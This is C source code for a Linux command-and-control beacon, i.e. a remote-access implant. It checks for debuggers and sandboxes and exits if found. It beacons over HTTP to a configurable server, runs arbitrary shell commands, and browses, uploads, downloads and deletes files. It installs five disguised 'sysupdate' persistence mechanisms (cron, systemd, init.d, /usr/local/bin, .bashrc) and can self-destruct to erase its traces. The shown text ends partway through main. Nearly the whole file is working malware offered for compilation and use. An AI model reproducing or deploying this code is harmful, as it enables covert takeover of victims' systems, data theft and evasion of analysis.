/*
 * Linux C2 Beacon — mirrors beacon_persist.c features
 * Compile: gcc -o beacon beacon_linux.c -s -Os
 * Terminal commands, file browser, process list, persistence — no extra deps
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/statvfs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <dlfcn.h>
#include <limits.h>
#include <linux/limits.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <syslog.h>

/* ====== COMPILE-TIME CONFIG ====== */
#define CFG_HOST    "YOUR_SERVER_IP"
#define CFG_PORT    8080
#define CFG_PATH    "/api.php"
#define CFG_SECRET  "CHANGE_ME_TO_64_HEX_CHARS"
#define CFG_UA      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

/* ====== GLOBALS ====== */
static char g_uuid[64], g_hostname[256], g_username[256];
static char g_uuid_path[PATH_MAX];
static char g_exe_path[PATH_MAX];
static int  g_uid;

/* ====== EVASION ====== */
static int is_debugged(void) {
    /* Check TracerPid in /proc/self/status — passive, no ptrace syscall needed */
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int pid = atoi(line + 10);
                fclose(f);
                return (pid != 0);
            }
        }
        fclose(f);
    }
    return 0;
}

static int is_sandbox(void) {
    /* Check CPU count */
    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu < 2) return 1;
    /* Check RAM */
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    if (pages * page_size < 2147483648LL) return 1; /* < 2GB */
    /* Check for common sandbox/VM artifacts — only match on explicit VM strings */
    const char *vm_tools[] = {
        "/usr/bin/vmware", "/usr/bin/vmtoolsd", "/usr/bin/VBoxService",
        "/usr/bin/VBoxClient", "/etc/vbox", NULL
    };
    for (int i = 0; vm_tools[i]; i++) {
        struct stat st;
        if (stat(vm_tools[i], &st) == 0) return 1;
    }
    /* Check DMI product name for VM signatures */
    FILE *dmi = fopen("/sys/class/dmi/id/product_name", "r");
    if (dmi) {
        char buf[128] = {0};
        fgets(buf, sizeof(buf), dmi);
        fclose(dmi);
        if (strstr(buf, "VMware") || strstr(buf, "VirtualBox") ||
            strstr(buf, "QEMU") || strstr(buf, "KVM") ||
            strstr(buf, "Xen") || strstr(buf, "innotek"))
            return 1;
    }
    /* Check disk space */
    struct statvfs vfs;
    if (statvfs("/", &vfs) == 0) {
        unsigned long long free_bytes = vfs.f_bsize * vfs.f_bavail;
        if (free_bytes < 5ULL * 1024 * 1024 * 1024) return 1; /* < 5GB */
    }
    return 0;
}

static int is_admin(void) {
    return (g_uid == 0);
}

/* ====== UUID PERSISTENCE ====== */
static void load_uuid(void) {
    snprintf(g_uuid_path, sizeof(g_uuid_path), "/tmp/.appdata.dat");

    /* Try to read existing UUID */
    FILE *f = fopen(g_uuid_path, "r");
    if (f) {
        if (fgets(g_uuid, sizeof(g_uuid), f)) {
            /* Strip newline */
            size_t len = strlen(g_uuid);
            while (len > 0 && (g_uuid[len-1] == '\n' || g_uuid[len-1] == '\r'))
                g_uuid[--len] = 0;
            if (len > 0) { fclose(f); return; }
        }
        fclose(f);
    }

    /* Generate new UUID from /dev/urandom */
    unsigned char rand_bytes[16];
    FILE *ur = fopen("/dev/urandom", "rb");
    if (ur) {
        fread(rand_bytes, 1, 16, ur);
        fclose(ur);
    } else {
        srand((unsigned)time(NULL) ^ (unsigned)getpid());
        for (int i = 0; i < 16; i++) rand_bytes[i] = rand() & 0xFF;
    }
    snprintf(g_uuid, sizeof(g_uuid),
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        rand_bytes[0],rand_bytes[1],rand_bytes[2],rand_bytes[3],
        rand_bytes[4],rand_bytes[5],rand_bytes[6],rand_bytes[7],
        rand_bytes[8],rand_bytes[9],rand_bytes[10],rand_bytes[11],
        rand_bytes[12],rand_bytes[13],rand_bytes[14],rand_bytes[15]);

    f = fopen(g_uuid_path, "w");
    if (f) { fprintf(f, "%s", g_uuid); fclose(f); }
}

static void get_sysinfo(void) {
    struct utsname uts;
    if (uname(&uts) == 0)
        snprintf(g_hostname, sizeof(g_hostname), "%s", uts.nodename);
    else
        gethostname(g_hostname, sizeof(g_hostname));

    struct passwd *pw = getpwuid(getuid());
    if (pw)
        snprintf(g_username, sizeof(g_username), "%s", pw->pw_name);
    else
        snprintf(g_username, sizeof(g_username), "%d", getuid());
}

/* ====== JSON HELPERS ====== */
static char *json_escape(const char *s) {
    if (!s) return strdup("");
    size_t cap = strlen(s) * 6 + 3;
    char *r = malloc(cap);
    if (!r) return NULL;
    char *d = r;
    *d++ = '"';
    while (*s) {
        if (*s == '"' || *s == '\\') { *d++ = '\\'; *d++ = *s++; }
        else if (*s == '\n') { *d++ = '\\'; *d++ = 'n'; s++; }
        else if (*s == '\r') { *d++ = '\\'; *d++ = 'r'; s++; }
        else if (*s == '\t') { *d++ = '\\'; *d++ = 't'; s++; }
        else if ((unsigned char)*s < 0x20) { d += sprintf(d, "\\u%04x", (unsigned char)*s); s++; }
        else { *d++ = *s++; }
    }
    *d++ = '"';
    *d = 0;
    return r;
}

static char *extract_value(const char *src, const char *key) {
    const char *p = strstr(src, key);
    if (!p) return NULL;
    p = strchr(p, ':');
    if (!p) return NULL;
    p++;
    while (*p == ' ') p++;
    if (*p == '"') {
        p++;
        const char *end = strchr(p, '"');
        if (!end) return NULL;
        size_t len = (size_t)(end - p);
        char *val = malloc(len + 1);
        if (!val) return NULL;
        strncpy(val, p, len);
        val[len] = 0;
        /* Unescape */
        char *d = val;
        for (char *s = val; *s; s++) {
            if (*s == '\\' && *(s+1)) { s++; *d++ = *s; }
            else *d++ = *s;
        }
        *d = 0;
        return val;
    }
    const char *end = p;
    while (*end && *end != ',' && *end != '}' && *end != ']' && *end != ' ') end++;
    size_t len = (size_t)(end - p);
    char *val = malloc(len + 1);
    if (!val) return NULL;
    strncpy(val, p, len);
    val[len] = 0;
    return val;
}

static int extract_int(const char *s) {
    while (*s && (*s < '0' || *s > '9')) s++;
    if (*s < '0' || *s > '9') return 0;
    int n = 0;
    while (*s >= '0' && *s <= '9') { n = n * 10 + (*s - '0'); s++; }
    return n;
}

/* ====== BASE64 ====== */
static const char b64alpha[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static char *b64_encode(const unsigned char *data, size_t len) {
    size_t out = (len + 2) / 3 * 4;
    char *r = malloc(out + 1);
    if (!r) return NULL;
    size_t i, j = 0;
    for (i = 0; i < len; i += 3) {
        unsigned int v = (unsigned int)data[i] << 16;
        if (i + 1 < len) v |= (unsigned int)data[i + 1] << 8;
        if (i + 2 < len) v |= data[i + 2];
        r[j++] = b64alpha[(v >> 18) & 0x3f];
        r[j++] = b64alpha[(v >> 12) & 0x3f];
        r[j++] = (i + 1 < len) ? b64alpha[(v >> 6) & 0x3f] : '=';
        r[j++] = (i + 2 < len) ? b64alpha[v & 0x3f] : '=';
    }
    r[j] = 0;
    return r;
}

/* ====== HTTP LAYER (raw sockets) ====== */
static int tcp_connect(void) {
    struct hostent *he = gethostbyname(CFG_HOST);
    if (!he) return -1;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return -1;
    struct timeval tv = {10, 0};
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(CFG_PORT);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        close(s);
        return -1;
    }
    return s;
}

static void tcp_close(int s) { close(s); }

static char *http_post(const char *action, const char *body) {
    int s = tcp_connect();
    if (s < 0) return NULL;
    size_t blen = body ? strlen(body) : 0;
    char hdr[2048];
    int hdr_n = snprintf(hdr, sizeof(hdr),
        "POST %s?action=%s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "Authorization: Bearer %s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n",
        CFG_PATH, action, CFG_HOST, CFG_PORT, CFG_UA, CFG_SECRET, blen);
    size_t total = hdr_n + blen;
    char *req = malloc(total + 1);
    if (!req) { tcp_close(s); return NULL; }
    memcpy(req, hdr, hdr_n);
    if (body && blen) memcpy(req + hdr_n, body, blen);
    req[total] = 0;
    send(s, req, total, 0);
    free(req);

    size_t cap = 65536, resp_total = 0;
    char *resp = malloc(cap);
    if (!resp) { tcp_close(s); return NULL; }
    ssize_t r;
    while ((r = recv(s, resp + resp_total, cap - resp_total - 1, 0)) > 0) {
        resp_total += r;
        if (cap - resp_total < 4096) {
            cap *= 2;
            char *tmp = realloc(resp, cap);
            if (!tmp) { free(resp); tcp_close(s); return NULL; }
            resp = tmp;
        }
    }
    resp[resp_total] = 0;
    tcp_close(s);
    char *hdr_end = strstr(resp, "\r\n\r\n");
    if (!hdr_end) { free(resp); return NULL; }
    char *body_out = strdup(hdr_end + 4);
    free(resp);
    return body_out;
}

static unsigned char *http_get_binary(const char *query, size_t *out_len) {
    int s = tcp_connect();
    if (s < 0) return NULL;
    char req[4096];
    int n = snprintf(req, sizeof(req),
        "GET %s?%s HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: %s\r\n"
        "Authorization: Bearer %s\r\nConnection: close\r\n\r\n",
        CFG_PATH, query, CFG_HOST, CFG_PORT, CFG_UA, CFG_SECRET);
    send(s, req, n, 0);
    size_t cap = 131072, total = 0;
    char *buf = malloc(cap);
    if (!buf) { tcp_close(s); return NULL; }
    ssize_t r;
    while ((r = recv(s, buf + total, cap - total - 1, 0)) > 0) {
        total += r;
        if (cap - total < 4096) {
            cap *= 2;
            char *tmp = realloc(buf, cap);
            if (!tmp) { free(buf); tcp_close(s); return NULL; }
            buf = tmp;
        }
    }
    buf[total] = 0;
    tcp_close(s);
    char *hdr_end = strstr(buf, "\r\n\r\n");
    if (!hdr_end) { free(buf); return NULL; }
    size_t body_start = (size_t)(hdr_end - buf + 4);
    size_t body_len = total - body_start;
    if (body_len == 0) { free(buf); return NULL; }
    unsigned char *data = malloc(body_len);
    if (!data) { free(buf); return NULL; }
    memcpy(data, buf + body_start, body_len);
    *out_len = body_len;
    free(buf);
    return data;
}

/* ====== COMMAND HANDLERS ====== */
static char *exec_shell(const char *cmd) {
    if (!cmd || !cmd[0]) return strdup("[-] empty command");
    FILE *fp = popen(cmd, "r");
    if (!fp) return strdup("[-] popen failed");
    size_t cap = 65536, used = 0;
    char *out = malloc(cap);
    if (!out) { pclose(fp); return strdup("[-] OOM"); }
    out[0] = 0;
    char buf[4096];
    while (fgets(buf, sizeof(buf), fp)) {
        size_t len = strlen(buf);
        while (used + len + 1 > cap) {
            cap *= 2;
            char *tmp = realloc(out, cap);
            if (!tmp) { free(out); pclose(fp); return strdup("[-] OOM"); }
            out = tmp;
        }
        memcpy(out + used, buf, len);
        used += len;
        out[used] = 0;
    }
    pclose(fp);
    if (used == 0) return strdup("(no output)");
    return out;
}

static char *read_file(const char *path) {
    if (!path || !path[0]) return strdup("[-] usage: read <path>");
    struct stat st;
    if (stat(path, &st) != 0) return strdup("[-] File not found");
    if (st.st_size > 10485760) return strdup("[-] File too large (>10MB)");
    if (st.st_size == 0) return strdup("(empty file)");
    FILE *f = fopen(path, "rb");
    if (!f) return strdup("[-] Cannot open file");
    char *buf = malloc(st.st_size + 1);
    if (!buf) { fclose(f); return strdup("[-] OOM"); }
    size_t rd = fread(buf, 1, st.st_size, f);
    fclose(f);
    buf[rd] = 0;

    /* Check if binary */
    int nulls = 0, nonprint = 0;
    for (size_t i = 0; i < rd; i++) {
        if (buf[i] == 0) nulls++;
        else if (buf[i] < 32 && buf[i] != '\n' && buf[i] != '\r' && buf[i] != '\t') nonprint++;
    }
    if (nulls > 0 || (rd > 0 && nonprint * 100 / rd > 30)) {
        char *b64 = b64_encode((unsigned char*)buf, rd);
        free(buf);
        return b64 ? b64 : strdup("[-] B64 encode failed");
    }
    return buf;
}

static char *browse_dir(const char *path) {
    if (!path || !path[0]) path = "/";
    DIR *d = opendir(path);
    if (!d) {
        char err[512];
        snprintf(err, sizeof(err), "{\"error\":\"Path not found: %s\"}", path);
        return strdup(err);
    }
    size_t cap = 65536, used = 0;
    char *buf = malloc(cap);
    if (!buf) { closedir(d); return strdup("{\"error\":\"OOM\"}"); }
    memcpy(buf, "{\"files\":[", 10); used = 10;
    int first = 1;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;

        char fullpath[PATH_MAX];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, ent->d_name);
        /* Remove double slashes for root */
        if (path[0] == '/' && path[1] == 0)
            snprintf(fullpath, sizeof(fullpath), "/%s", ent->d_name);

        struct stat st;
        int is_dir = 0;
        off_t fsize = 0;
        char mod[32] = "";
        if (lstat(fullpath, &st) == 0) {
            is_dir = S_ISDIR(st.st_mode);
            fsize = st.st_size;
            struct tm *tm = localtime(&st.st_mtime);
            if (tm) strftime(mod, sizeof(mod), "%Y-%m-%dT%H:%M:%S", tm);
        }

        char *esc_name = json_escape(ent->d_name);
        char entry[1200];
        int elen = snprintf(entry, sizeof(entry),
            "{\"name\":%s,\"type\":\"%s\",\"size\":%ld,\"modified\":\"%s\"}",
            esc_name, is_dir ? "dir" : "file", (long)fsize, mod);
        free(esc_name);
        if (elen < 0) continue;

        while (used + (size_t)elen + 3 > cap) {
            cap *= 2;
            char *tmp = realloc(buf, cap);
            if (!tmp) { free(buf); closedir(d); return strdup("{\"error\":\"OOM\"}"); }
            buf = tmp;
        }
        if (!first) buf[used++] = ',';
        first = 0;
        memcpy(buf + used, entry, (size_t)elen);
        used += (size_t)elen;
        buf[used] = 0;
    }
    closedir(d);
    buf[used++] = ']';
    buf[used++] = '}';
    buf[used] = 0;
    return buf;
}

static char *list_drives(void) {
    /* On Linux, list mounted filesystems from /proc/mounts */
    FILE *f = fopen("/proc/mounts", "r");
    size_t cap = 4096, used = 0;
    char *buf = malloc(cap);
    if (!buf) return strdup("{\"error\":\"OOM\"}");
    memcpy(buf, "{\"files\":[", 10); used = 10;
    int first = 1;

    /* Always include root first */
    struct statvfs vfs;
    unsigned long long root_total = 0;
    if (statvfs("/", &vfs) == 0)
        root_total = (unsigned long long)(vfs.f_blocks - vfs.f_bfree) * vfs.f_frsize;

    char entry[512];
    int elen = snprintf(entry, sizeof(entry),
        "{\"name\":\"/\",\"type\":\"drive\",\"drive_type\":\"root\",\"size\":%llu,\"modified\":\"\"}",
        root_total);
    memcpy(buf + used, entry, (size_t)elen);
    used += (size_t)elen;

    if (f) {
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            char dev[256] = "", mount_raw[512] = "", fstype[64] = "";
            if (sscanf(line, "%255s %511s %63s", dev, mount_raw, fstype) < 3) continue;
            /* Strip quotes from mount path (e.g. "efivarfs") */
            char mount[512];
            const char *mp = mount_raw;
            if (mp[0] == '"') mp++;
            size_t mlen = strlen(mp);
            while (mlen > 0 && mp[mlen-1] == '"') mlen--;
            strncpy(mount, mp, mlen);
            mount[mlen] = 0;
            /* Skip virtual/pseudo filesystems */
            if (strstr(dev, "/loop") == dev || strstr(dev, "tmpfs") ||
                strstr(dev, "devtmpfs") || strstr(dev, "sysfs") ||
                strstr(dev, "proc") || strstr(dev, "cgroup") ||
                strstr(dev, "udev") || strstr(dev, "pts"))
                continue;
            /* Skip root since we already added it */
            if (strcmp(mount, "/") == 0) continue;

            /* Get disk info */
            struct statvfs mvfs;
            unsigned long long total = 0;
            if (statvfs(mount, &mvfs) == 0)
                total = (unsigned long long)(mvfs.f_blocks - mvfs.f_bfree) * mvfs.f_frsize;

            char *esc_dev = json_escape(dev);
            char *esc_mount = json_escape(mount);
            elen = snprintf(entry, sizeof(entry),
                ",{\"name\":%s,\"mount\":\"%s\",\"type\":\"drive\",\"drive_type\":\"%s\",\"size\":%llu,\"modified\":\"\"}",
                esc_mount, esc_dev, fstype, total);
            free(esc_dev);
            free(esc_mount);

            while (used + (size_t)elen + 3 > cap) {
                cap *= 2;
                char *tmp = realloc(buf, cap);
                if (!tmp) { free(buf); fclose(f); return strdup("{\"error\":\"OOM\"}"); }
                buf = tmp;
            }
            memcpy(buf + used, entry, (size_t)elen);
            used += (size_t)elen;
        }
        fclose(f);
    }
    buf[used++] = ']';
    buf[used++] = '}';
    buf[used] = 0;
    return buf;
}

static char *upload_file(const char *path) {
    if (!path || !path[0]) return strdup("[-] usage: pull <path>");
    struct stat st;
    if (stat(path, &st) != 0) return strdup("[-] File not found");
    if (st.st_size > 10485760) return strdup("[-] File too large (>10MB)");
    FILE *f = fopen(path, "rb");
    if (!f) return strdup("[-] Cannot open file");
    unsigned char *data = malloc(st.st_size);
    if (!data) { fclose(f); return strdup("[-] OOM"); }
    size_t rd = fread(data, 1, st.st_size, f);
    fclose(f);
    char *b64 = b64_encode(data, rd);
    free(data);
    if (!b64) return strdup("[-] B64 failed");
    char *esc_data = json_escape(b64);
    free(b64);
    if (!esc_data) return strdup("[-] Escape failed");
    const char *fname = strrchr(path, '/');
    fname = fname ? fname + 1 : path;
    char *esc_name = json_escape(fname);
    char *uuid_e = json_escape(g_uuid);
    size_t body_sz = strlen(esc_data) + strlen(esc_name) + strlen(uuid_e) + 256;
    char *body = malloc(body_sz);
    snprintf(body, body_sz, "{\"beacon_uuid\":%s,\"filename\":%s,\"data\":%s}", uuid_e, esc_name, esc_data);
    char *resp = http_post("file", body);
    free(body); free(uuid_e); free(esc_name); free(esc_data);
    char *result = malloc(strlen(fname) + 64);
    if (resp && strstr(resp, "\"uploaded\""))
        snprintf(result, strlen(fname) + 64, "[UPLOADED] %s (%zu bytes)", fname, rd);
    else
        snprintf(result, strlen(fname) + 64, "[FAILED] %s", fname);
    free(resp);
    return result;
}

static char *cmd_download(const char *arg) {
    char file_id[256], out_path[PATH_MAX];
    if (sscanf(arg, "%255s %1023s", file_id, out_path) < 2)
        return strdup("[-] usage: push <file_id> <output_path>");
    char query[512];
    snprintf(query, sizeof(query), "action=file&id=%s", file_id);
    size_t len = 0;
    unsigned char *data = http_get_binary(query, &len);
    if (!data) return strdup("[-] Download failed");
    /* Create parent dir if needed */
    char parent[PATH_MAX];
    strncpy(parent, out_path, sizeof(parent));
    char *last = strrchr(parent, '/');
    if (last) { *last = 0; mkdir(parent, 0755); }
    FILE *f = fopen(out_path, "wb");
    if (!f) { free(data); return strdup("[-] Cannot write output path"); }
    fwrite(data, 1, len, f);
    fclose(f);
    free(data);
    char *result = malloc(PATH_MAX + 64);
    snprintf(result, PATH_MAX + 64, "[+] Downloaded %zu bytes to %s", len, out_path);
    return result;
}

static char *cmd_delete(const char *path) {
    if (!path || !path[0]) return strdup("[-] usage: delete <path>");
    struct stat st;
    if (stat(path, &st) != 0) return strdup("[-] Not found");
    if (S_ISDIR(st.st_mode)) {
        /* Recursive remove */
        char cmd[PATH_MAX + 64];
        snprintf(cmd, sizeof(cmd), "rm -rf \"%s\"", path);
        int rc = system(cmd);
        return rc == 0 ? strdup("[+] Directory removed") : strdup("[-] Remove failed");
    } else {
        if (unlink(path) == 0) return strdup("[+] Deleted");
        return strdup("[-] Delete failed");
    }
}

/* ====== SCREENSHOT + CAMERA (stub — add later) ====== */
static char *take_screenshot(void) {
    return strdup("[-] Screenshot not available on this build");
}

static char *cmd_camera(void) {
    return strdup("[-] Camera not available on this build");
}

/* ====== PERSISTENCE ====== */
static char *persist(void) {
    int methods = 0;
    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len <= 0) return strdup("[-] Cannot determine exe path");
    exe_path[len] = 0;

    /* Method 1: Crontab — @reboot */
    char cron_cmd[PATH_MAX + 128];
    snprintf(cron_cmd, sizeof(cron_cmd),
        "(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s') | crontab -", exe_path, exe_path);
    if (system(cron_cmd) == 0) methods++;

    /* Method 2: systemd user service */
    char svc_dir[PATH_MAX];
    snprintf(svc_dir, sizeof(svc_dir), "%s/.config/systemd/user", getenv("HOME") ?: "/root");
    mkdir(svc_dir, 0755);
    char svc_file[PATH_MAX];
    snprintf(svc_file, sizeof(svc_file), "%s/sysupdate.service", svc_dir);
    FILE *f = fopen(svc_file, "w");
    if (f) {
        fprintf(f,
            "[Unit]\nDescription=System Update\nAfter=network.target\n\n"
            "[Service]\nType=simple\nExecStart=%s\nRestart=always\n\n"
            "[Install]\nWantedBy=default.target\n", exe_path);
        fclose(f);
        char enable_cmd[PATH_MAX + 256];
        snprintf(enable_cmd, sizeof(enable_cmd),
            "systemctl --user enable sysupdate.service 2>/dev/null && systemctl --user start sysupdate.service 2>/dev/null");
        if (system(enable_cmd) == 0) methods++;
    }

    /* Method 3: Init.d script */
    if (is_admin()) {
        char initd_path[] = "/etc/init.d/sysupdate";
        f = fopen(initd_path, "w");
        if (f) {
            fprintf(f,
                "#!/bin/sh\n### BEGIN INIT INFO\n"
                "# Provides:          sysupdate\n"
                "# Required-Start:    $remote_fs $syslog\n"
                "# Required-Stop:     $remote_fs $syslog\n"
                "# Default-Start:     2 3 4 5\n"
                "# Default-Stop:      0 1 6\n"
                "# Short-Description: System Update\n"
                "### END INIT INFO\n\n"
                "case \"$1\" in\n"
                "  start)\n    %s &\n    ;;\n"
                "  stop)\n    pkill -f '%s'\n    ;;\n"
                "  restart)\n    $0 stop; sleep 1; $0 start\n    ;;\n"
                "  *)\n    echo \"Usage: $0 {start|stop|restart}\"\n    ;;\n"
                "esac\nexit 0\n", exe_path, exe_path);
            fclose(f);
            chmod(initd_path, 0755);
            if (system("update-rc.d sysupdate defaults 2>/dev/null") == 0) methods++;
        }
    }

    /* Method 4: Copy to /usr/local/bin */
    if (is_admin()) {
        char dest[] = "/usr/local/bin/sysupdate";
        char cp_cmd[PATH_MAX + 64];
        snprintf(cp_cmd, sizeof(cp_cmd), "cp \"%s\" \"%s\" && chmod 755 \"%s\"", exe_path, dest, dest);
        if (system(cp_cmd) == 0) methods++;
    }

    /* Method 5: .bashrc */
    char bashrc[PATH_MAX];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", getenv("HOME") ?: "/root");
    char marker[] = "# sysupdate-autostart";
    f = fopen(bashrc, "a");
    if (f) {
        fprintf(f, "\n%s\n[ -f /tmp/.appdata.dat ] || (nohup %s &>/dev/null &)\n%s\n",
            marker, exe_path, marker);
        fclose(f);
        methods++;
    }

    char result[256];
    snprintf(result, sizeof(result), "[+] Persistence added (%d methods)", methods);
    return strdup(result);
}

static void self_destruct(void) {
    /* Remove persistence artifacts */

    /* 1. Crontab */
    char cron_cmd[PATH_MAX + 128];
    snprintf(cron_cmd, sizeof(cron_cmd),
        "crontab -l 2>/dev/null | grep -v '%s' | crontab -", g_exe_path);
    system(cron_cmd);

    /* 2. Systemd service */
    system("systemctl --user stop sysupdate.service 2>/dev/null");
    system("systemctl --user disable sysupdate.service 2>/dev/null");
    char svc_file[PATH_MAX];
    snprintf(svc_file, sizeof(svc_file), "%s/.config/systemd/user/sysupdate.service",
             getenv("HOME") ?: "/root");
    unlink(svc_file);

    /* 3. Init.d */
    if (is_admin()) {
        system("update-rc.d sysupdate remove 2>/dev/null");
        unlink("/etc/init.d/sysupdate");
        unlink("/usr/local/bin/sysupdate");
    }

    /* 4. .bashrc cleanup */
    char bashrc[PATH_MAX];
    snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", getenv("HOME") ?: "/root");
    /* Remove lines between markers */
    char sed_cmd[PATH_MAX + 128];
    snprintf(sed_cmd, sizeof(sed_cmd),
        "sed -i '/# sysupdate-autostart/,/# sysupdate-autostart/d' \"%s\"", bashrc);
    system(sed_cmd);

    /* 5. UUID file */
    unlink(g_uuid_path);

    /* 6. Delete self */
    unlink(g_exe_path);

    _exit(0);
}

/* ====== PROCESS LISTING ====== */
static char *list_processes(void) {
    DIR *proc = opendir("/proc");
    if (!proc) return strdup("{\"error\":\"Cannot open /proc\"}");
    size_t cap = 65536, used = 0;
    char *buf = malloc(cap);
    if (!buf) { closedir(proc); return strdup("{\"error\":\"OOM\"}"); }
    memcpy(buf, "{\"files\":[", 10); used = 10;
    int first = 1;
    struct dirent *ent;
    while ((ent = readdir(proc)) != NULL) {
        /* Check if PID (all digits) */
        int is_pid = 1;
        for (char *c = ent->d_name; *c; c++) {
            if (*c < '0' || *c > '9') { is_pid = 0; break; }
        }
        if (!is_pid) continue;

        char status_path[256], cmdline_path[256];
        snprintf(status_path, sizeof(status_path), "/proc/%s/status", ent->d_name);
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", ent->d_name);

        /* Get process name from status */
        char pname[256] = "?";
        FILE *sf = fopen(status_path, "r");
        if (sf) {
            char line[512];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "Name:", 5) == 0) {
                    char *p = line + 5;
                    while (*p == ' ' || *p == '\t') p++;
                    size_t nlen = strlen(p);
                    while (nlen > 0 && (p[nlen-1] == '\n' || p[nlen-1] == '\r')) p[--nlen] = 0;
                    strncpy(pname, p, sizeof(pname)-1);
                    break;
                }
            }
            fclose(sf);
        }

        /* Get cmdline */
        char cmdstr[512] = "";
        FILE *cf = fopen(cmdline_path, "r");
        if (cf) {
            size_t rd = fread(cmdstr, 1, sizeof(cmdstr)-1, cf);
            fclose(cf);
            cmdstr[rd] = 0;
            /* Replace null bytes with spaces */
            for (size_t i = 0; i < rd; i++)
                if (cmdstr[i] == 0) cmdstr[i] = ' ';
            /* Trim trailing space */
            size_t slen = strlen(cmdstr);
            while (slen > 0 && cmdstr[slen-1] == ' ') cmdstr[--slen] = 0;
        }

        char *esc_name = json_escape(pname);
        char *esc_cmd = json_escape(cmdstr[0] ? cmdstr : pname);
        char entry[1500];
        int elen = snprintf(entry, sizeof(entry),
            "{\"name\":%s,\"type\":\"file\",\"pid\":%s,\"cmdline\":%s,\"size\":0,\"modified\":\"\"}",
            esc_name, ent->d_name, esc_cmd);
        free(esc_name);
        free(esc_cmd);
        if (elen < 0) continue;

        while (used + (size_t)elen + 3 > cap) {
            cap *= 2;
            char *tmp = realloc(buf, cap);
            if (!tmp) { free(buf); closedir(proc); return strdup("{\"error\":\"OOM\"}"); }
            buf = tmp;
        }
        if (!first) buf[used++] = ',';
        first = 0;
        memcpy(buf + used, entry, (size_t)elen);
        used += (size_t)elen;
    }
    closedir(proc);
    buf[used++] = ']';
    buf[used++] = '}';
    buf[used] = 0;
    return buf;
}

static char *kill_pid(const char *arg) {
    if (!arg || !arg[0]) return strdup("[-] usage: kill <pid>");
    int pid = atoi(arg);
    if (pid <= 0) return strdup("[-] Invalid PID");
    if (kill(pid, SIGKILL) == 0) return strdup("[+] Process killed");
    return strdup("[-] Kill failed (permission denied?)");
}

/* ====== COMMAND DISPATCH ====== */
static char *exec_task(const char *cmd) {
    if (!cmd || !cmd[0]) return strdup("[ERROR] empty command");
    char buf[4096];
    strncpy(buf, cmd, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *sp = strchr(buf, ' ');
    size_t alen = sp ? (size_t)(sp - buf) : strlen(buf);
    char action[256];
    strncpy(action, buf, alen);
    action[alen] = 0;
    const char *arg = sp ? sp + 1 : "";

    if (strcmp(action, "shell") == 0) return exec_shell(arg);
    if (strcmp(action, "browse") == 0) return browse_dir(arg);
    if (strcmp(action, "drives") == 0) return list_drives();
    if (strcmp(action, "read") == 0) return read_file(arg);
    if (strcmp(action, "ps") == 0) return list_processes();
    if (strcmp(action, "pull") == 0 || strcmp(action, "upload") == 0) return upload_file(arg);
    if (strcmp(action, "push") == 0 || strcmp(action, "download") == 0) return cmd_download(arg);
    if (strcmp(action, "delete") == 0) return cmd_delete(arg);
    if (strcmp(action, "screenshot") == 0) return take_screenshot();
    if (strcmp(action, "camera") == 0 || strcmp(action, "cam") == 0) return cmd_camera();
    if (strcmp(action, "kill") == 0) return kill_pid(arg);
    if (strcmp(action, "hostname") == 0) {
        char *r = malloc(256);
        snprintf(r, 256, "%s", g_hostname);
        return r;
    }
    if (strcmp(action, "ipconfig") == 0 || strcmp(action, "ifconfig") == 0) {
        return exec_shell("ip -br addr 2>/dev/null || ifconfig");
    }
    if (strcmp(action, "persist") == 0) return persist();
    if (strcmp(action, "ping") == 0) {
        time_t now_t = time(NULL);
        struct tm *tm = localtime(&now_t);
        char *b = malloc(64);
        strftime(b, 64, "[PONG] %Y-%m-%d %H:%M:%S", tm);
        return b;
    }
    if (strcmp(action, "die") == 0 || strcmp(action, "killself") == 0) _exit(0);
    if (strcmp(action, "selfdestruct") == 0) { self_destruct(); return strdup("[SELFDESTRUCT]"); }
    /* Default: run as shell */
    return exec_shell(cmd);
}

/* ====== MAIN ====== */
int main(int argc, char *argv[]) {
    /* Evasion */
    if (is_debugged()) return 0;
    if (is_sandbox()) return 0;

    /* Detach from terminal */
    setsid();

    /* Record exe path */
